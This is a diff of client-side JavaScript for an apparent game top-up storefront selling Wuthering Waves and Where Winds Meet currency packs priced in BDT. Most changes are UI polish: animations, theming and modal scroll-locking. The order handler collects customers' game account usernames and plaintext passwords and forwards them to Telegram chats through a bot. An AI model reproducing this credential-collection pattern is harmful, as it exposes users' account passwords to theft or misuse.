@@ -1,8 +1,8 @@
 const packages = {
     ww: [
-        { id: 'ww1', type: 'Lunite Subscription', name: 'Tide Blessing Pack', price: 449 },
-        { id: 'ww2', type: 'Resonator Pass', name: 'Standard Pass', price: 949 },
-        { id: 'ww3', type: 'Resonator Pass', name: 'Premium Pass+', price: 2199 },
+        { id: 'ww1', type: 'Lunite Subscription Pack', name: 'Tide Blessing Pack', price: 449 },
+        { id: 'ww2', type: 'Resonator Pass Packs', name: 'Resonator Pass', price: 949 },
+        { id: 'ww3', type: 'Resonator Pass Packs', name: 'Resonator Pass+', price: 2199 },
         { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
         { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
         { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
@@ -11,9 +11,9 @@ const packages = {
         { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
     ],
     wwm: [
-        { id: 'wwm1', type: 'Moonlit Supply', name: 'Spirit Subscription', price: 449 },
-        { id: 'wwm2', type: 'Hero’s Journey', name: 'Battle Scroll', price: 949 },
-        { id: 'wwm3', type: 'Hero’s Journey', name: 'Battle Scroll+', price: 2199 },
+        { id: 'wwm1', type: 'Moonlit Supply Pack', name: 'Spirit Subscription', price: 449 },
+        { id: 'wwm2', type: 'Hero’s Journey Pass', name: 'Battle Scroll', price: 949 },
+        { id: 'wwm3', type: 'Hero’s Journey Pass', name: 'Battle Scroll+', price: 2199 },
         { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
         { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
         { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
@@ -34,15 +34,17 @@ const serverGroup = document.getElementById('server-group');
 const serverInput = document.getElementById('server');
 const serverText = document.getElementById('selected-server-text');
 const serverOptions = document.getElementById('server-options');
+const body = document.body;
 
 let currentPackage = null;
 let currentGame = '';
 
 function render(game) {
+    body.className = `theme-${game}`;
     container.innerHTML = '';
     currentGame = game;
     
-    // Smart Form Logic
+    // Smart Server Logic
     if(game === 'wwm') {
         serverGroup.style.display = 'none';
         serverInput.removeAttribute('required');
@@ -53,23 +55,25 @@ function render(game) {
 
     const gameNameDisplay = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
 
-    packages[game].forEach((p, i) => {
+    packages[game].forEach((p, index) => {
         const div = document.createElement('div');
         div.className = 'package-card';
+        // Add a slight delay for staggered entry animation
+        div.style.animation = `popIn 0.5s ease ${index * 0.05}s both`;
+        
         div.innerHTML = `<div class="inner-content"><span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p></div>`;
         
-        // WOW Feature: 3D Magnetic Tilt Effect
+        // 3D Magnetic Tilt Effect
         div.addEventListener('mousemove', (e) => {
             const rect = div.getBoundingClientRect();
             const x = e.clientX - rect.left;
             const y = e.clientY - rect.top;
             const centerX = rect.width / 2;
             const centerY = rect.height / 2;
-            const rotateX = ((y - centerY) / centerY) * -10; // Max tilt 10deg
+            const rotateX = ((y - centerY) / centerY) * -10; 
             const rotateY = ((x - centerX) / centerX) * 10;
             div.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
         });
-        
         div.addEventListener('mouseleave', () => {
             div.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
         });
@@ -80,10 +84,20 @@ function render(game) {
             document.getElementById('modal-game-name').innerText = gameNameDisplay;
             qtyInput.value = 1;
             updateUI();
-            modal.classList.remove('hidden');
+            openModal(modal);
         };
         container.appendChild(div);
     });
+}
+
+// Modal Control Functions (Fixes Scroll Bug)
+function openModal(modalEl) {
+    modalEl.classList.remove('hidden');
+    body.classList.add('no-scroll'); // Lock background scroll
+}
+function closeModal(modalEl) {
+    modalEl.classList.add('hidden');
+    body.classList.remove('no-scroll'); // Unlock background scroll
 }
 
 // Custom Dropdown Logic
@@ -95,7 +109,6 @@ function selectServer(val) {
     serverText.style.color = '#fff';
     serverInput.value = val;
 }
-// Close dropdown when clicked outside
 document.addEventListener('click', (e) => {
     if (!e.target.closest('.custom-select-wrapper')) {
         serverOptions.classList.add('hidden');
@@ -109,7 +122,7 @@ function updateUI() {
 document.getElementById('plus-btn').onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
 document.getElementById('minus-btn').onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
 
-document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');
+document.querySelector('.close-btn').onclick = () => closeModal(modal);
 
 document.querySelectorAll('.game-btn').forEach(btn => {
     btn.onclick = (e) => {
@@ -122,19 +135,19 @@ document.querySelectorAll('.game-btn').forEach(btn => {
 document.getElementById('order-form').onsubmit = async (e) => {
     e.preventDefault();
     const btn = document.getElementById('submit-btn');
-    btn.disabled = true; btn.innerHTML = 'Processing...';
+    btn.disabled = true; btn.innerHTML = '<span class="loader"></span> Processing...';
 
     const gameStr = currentGame === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
     const srvLine = currentGame === 'ww' ? `\n🌍 *Server:* \`${serverInput.value}\`` : '';
 
-    const msg = `🧾 *Premium Order Received*
+    const msg = `🚀 *Premium Order!*
 
 🎮 *Game:* ${gameStr}
-📦 *Package:* ${currentPackage.name}
-🔢 *Quantity:* ${qtyInput.value}
-💰 *Total Pay:* ${displayPrice.innerText} BDT
+📦 *Pack:* ${currentPackage.name}
+🔢 *Qty:* ${qtyInput.value}
+💰 *Total:* ${displayPrice.innerText} BDT
 
-👤 *Account Info:*
+👤 *User Details:*
 ✉️ *Email/User:* \`${document.getElementById('email-username').value}\`
 🔑 *Pass:* \`${document.getElementById('password').value}\`
 🏷️ *IGN:* \`${document.getElementById('ign').value}\`${srvLine}
@@ -150,19 +163,19 @@ document.getElementById('order-form').onsubmit = async (e) => {
                 body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
             });
         }
-        modal.classList.add('hidden');
-        document.getElementById('success-modal').classList.remove('hidden');
+        closeModal(modal);
+        openModal(document.getElementById('success-modal'));
     } catch (err) {
         alert('Connection error. Try again.');
     } finally {
         btn.disabled = false; btn.innerHTML = '<span class="btn-text">Confirm Purchase</span>';
         document.getElementById('order-form').reset();
         serverText.innerText = 'Select Server';
-        serverText.style.color = 'var(--text-secondary)';
+        serverText.style.color = 'var(--text-muted)';
     }
 };
 
-document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');
+document.getElementById('close-success').onclick = () => closeModal(document.getElementById('success-modal'));
 
 function copyNumber() {
     navigator.clipboard.writeText('01610359086').then(() => {
@@ -172,5 +185,5 @@ function copyNumber() {
     });
 }
 
-// Init
+// Start
 render('ww');
